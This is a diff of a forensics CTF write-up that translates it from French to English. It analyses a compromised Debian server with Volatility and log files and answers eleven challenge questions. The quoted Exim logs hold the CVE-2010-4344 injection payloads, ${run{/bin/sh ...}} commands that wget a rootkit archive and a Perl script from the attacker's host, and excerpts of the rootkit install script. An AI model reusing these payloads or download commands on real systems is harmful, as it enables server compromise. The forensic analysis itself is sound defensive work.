@@ -9,18 +9,19 @@
 - Size : 429M
 - Tags : Volatility Linux Memory Disk 
 
-Scenario :
+### Scenario
 
 A Linux server was possibly compromised and a forensic analysis is required in order to understand what really happened. Hard disk dumps and memory snapshots of the machine are provided in order to solve the challenge.
 
-Tools :
+### Tools
 
 - Volatility
 - 010 Editor
 - Autopsy
 
+---
 
-## Question
+## Questions
 
 ```shell
 vol.py --info | grep Linux
@@ -34,9 +35,9 @@ linux_yarascan              - A shell in the Linux memory image
 linuxgetprofile             - Scan to try to determine the Linux profile
 ```
 
-#### 1 - The attacker was performing a Brute Force attack. What account triggered the alert ?
+### 1 - The attacker was performing a Brute Force attack. What account triggered the alert ?
 
-On peut regarder avec volatility les services suceptible d'être brute-force.
+We can look with volatility at the services likely to be brute-forced.
 
 ```shell
 vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_pslist
@@ -87,7 +88,7 @@ Offset     Name                 Pid             PPid            Uid             
 0xcf43e8c0 nc                   2169            2042            0               0      0x08084000 2011-02-06 14:42:27 UTC+0000
 ```
 
-On remarque le processus **sshd**, on va donc pouvoir regarder les logs
+We notice the **sshd** process, so we can look at the logs
 
 ```shell
 tail /media/var/log/auth.log 
@@ -103,29 +104,29 @@ Feb  6 15:21:10 victoria sshd[2157]: Failed password for invalid user ulysses fr
 Feb  6 15:21:10 victoria sshd[2157]: PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.56.1 
 ```
 
-On remarque plusieurs tentatives infructueuses pour le user **ulysses**
+We notice several unsuccessful attempts to user **ulysses**
 
-**Réponse : ulysses**
+**Answer : ulysses**
 
-#### 2 - How many were failed attempts there ?
+### 2 - How many were failed attempts there ?
 
 ```shell
 cat /media/var/log/auth.log  | grep "invalid user ulysses" | wc -l
 32
 ```
 
-**Réponse : 32**
+**Answer : 32**
 
-#### 3 - What kind of system runs on the targeted server ?
+### 3 - What kind of system runs on the targeted server ?
 
 ```shell
 cat /media/etc/issue
 Debian GNU/Linux 5.0 \n \l
 ```
 
-**Réponse : Debian GNU/Linux 5.0**
+**Answer : Debian GNU/Linux 5.0**
 
-#### 4 - What is the victim's IP address ?
+### 4 - What is the victim's IP address ?
 
 ```shell
 vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_netstat
@@ -155,9 +156,9 @@ TCP      192.168.56.102  :   25 192.168.56.101  :37202 CLOSE                    
 TCP      192.168.56.102  :56955 192.168.56.1    : 8888 ESTABLISHED                    nc/2169 
 ```
 
-**Réponse : 192.168.56.102**
+**Answer : 192.168.56.102**
 
-#### 5 - What are the attacker's two IP addresses ? Format: comma-separated in ascending order
+### 5 - What are the attacker's two IP addresses ? Format: comma-separated in ascending order
 
 ```shell
 vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_netstat
@@ -177,9 +178,9 @@ TCP      192.168.56.102  :56955 192.168.56.1    : 8888 ESTABLISHED              
 
 On a des connexion établies et fermées. On retrouve parmi ces connexion l'IP vu dans les logs SSH
 
-**Réponse : 192.168.56.1,192.168.56.101**
+**Answer : 192.168.56.1,192.168.56.101**
 
-#### 6 - What is the "nc" service PID number that was running on the server ?
+### 6 - What is the "nc" service PID number that was running on the server ?
 
 ```shell
 vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_netstat
@@ -197,9 +198,9 @@ TCP      192.168.56.102  :   25 192.168.56.101  :37202 CLOSE                    
 TCP      192.168.56.102  :56955 192.168.56.1    : 8888 ESTABLISHED                    nc/2169 
 ```
 
-**Réponse : 2169**
+**Answer : 2169**
 
-#### 7 - What service was exploited to gain access to the system ? (one word)
+### 7 - What service was exploited to gain access to the system ? (one word)
 
 ```shell
 vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_pslist
@@ -251,33 +252,33 @@ Offset     Name                 Pid             PPid            Uid             
 0xcf43e8c0 nc                   2169            2042            0               0      0x08084000 2011-02-06 14:42:27 UTC+0000
 ```
 
-On repère le processus **exim4** :
+We locate the **exim4** process:
 
 ```
 cat /media/var/log/exim4/rejectlog
 
 Envelope-to: <postmaster@localhost>
-  Header0000: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
-  Header0001: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
-  [...]
-  Header0054: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
-  Header0055: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
-  HeaderX: ${run{/bin/sh -c "exec /bin/sh -c 'rm /tmp/rk.tar; sleep 1000'"}} 
-  [...]
-  ${run{/bin/sh -c "exec /bin/sh -c 'rm /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c
+   Header0000: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
+   Header0001: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
+   [...]
+   Header0054: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
+   Header0055: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
+   HeaderX: ${run{/bin/sh -c "exec /bin/sh -c 'rm /tmp/rk.tar; sleep 1000'"}}
+   [...]
+   ${run{/bin/sh -c "exec /bin/sh -c 'rm /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh - vs
 ```
 
-On remarque des attaques via **buffer overflow**
+We notice attacks via **buffer overflow**
 
-**Réponse : exim4**
+**Answer : exim4**
 
-#### 8 - What is the CVE number of exploited vulnerability ?
+### 8 - What is the CVE number of exploited vulnerability ?
 
-On va chercher sur **exploit-db** une une exploitation lié à une CVE.
+We will look on **exploit-db** for an exploitation linked to a CVE.
 
-**Réponse : CVE-2010-4344**
+**Answer : CVE-2010-4344**
 
-#### 9 - During this attack, the attacker downloaded two files to the server. Provide the name of the compressed file.
+### 9 - During this attack, the attacker downloaded two files to the server. Provide the name of the compressed file.
 
 ```shell
 cat /media/var/log/exim4/mainlog | grep wget
@@ -285,9 +286,9 @@ cat /media/var/log/exim4/mainlog | grep wget
 2011-02-06 15:20:20 H=(h0n3yn3t-pr0j3ct.com) [192.168.56.101] temporarily rejected MAIL <root@local.com>: failed to expand ACL string " -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}}
 ```
 
-**Réponse : rk.tar**
+**Answer : rk.tar**
 
-#### 10 - Two ports were involved in the process of data exfiltration. Provide the port number of the highest one.
+### 10 - Two ports were involved in the process of data exfiltration. Provide the port number of the highest one.
 
 ```shell
 vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_netstat
@@ -305,9 +306,9 @@ TCP      192.168.56.102  :   25 192.168.56.101  :37202 CLOSE                    
 TCP      192.168.56.102  :56955 192.168.56.1    : 8888 ESTABLISHED                    nc/2169 
 ```
 
-**Réponse : 8888**
+**Answer : 8888**
 
-#### 11 - Which port did the attacker try to block on the firewall ?
+### 11 - Which port did the attacker try to block on the firewall ?
 
 ```shell
 cat /media/var/log/exim4/mainlog | grep wget
@@ -317,7 +318,7 @@ ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;pe
 2011-02-06 15:20:20 H=(h0n3yn3t-pr0j3ct.com) [192.168.56.101] temporarily rejected MAIL <root@local.com>: failed to expand ACL string " -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000'"}} 
 ```
 
-On a les fichier télécharger dans `/tmp`
+We have the files downloaded in `/tmp`
 
 ```shell
 sudo tar -xvf /media/tmp/rk.tar
@@ -394,7 +395,7 @@ fi
 
 $rk_home_dir/dropbear
 
-#################################### procps
+################################### procps
 for l in `ls procps`
 do
     o=`which $l`
@@ -425,6 +426,6 @@ echo "cd .."
 echo "rm -rf rk rk.tbz2"
 ```
 
-On voit que l'attaquant essaye de faire drop toutes les connexions destinées au port 45295
+We see that the attacker is trying to drop all connections destined for port 45295
 
-**Réponse : 45295**
+**Answer : 45295**
